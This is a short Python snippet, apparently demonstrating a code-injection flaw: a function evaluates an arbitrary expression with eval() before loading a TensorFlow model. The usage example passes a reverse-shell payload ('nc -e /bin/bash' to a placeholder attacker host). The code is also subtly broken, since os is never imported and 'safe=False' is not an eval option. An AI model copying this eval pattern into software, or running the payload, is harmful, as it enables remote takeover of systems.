import numpy as np
import tensorflow as tf

# Vulnerable code that uses eval with safe=False
def load_model_with_eval(model_path, expression):
    # This is the vulnerable part where eval can be exploited
    result = eval(expression)  # Unsafe evaluation
    model = tf.saved_model.load(model_path)
    return model, result

# Usage (this could be exploited)
model_path = "path/to/your/saved_model"
expression = "os.system('nc -e /bin/bash attacker_ip attacker_port')"  # Example of a malicious expression
model, output = load_model_with_eval(model_path, expression)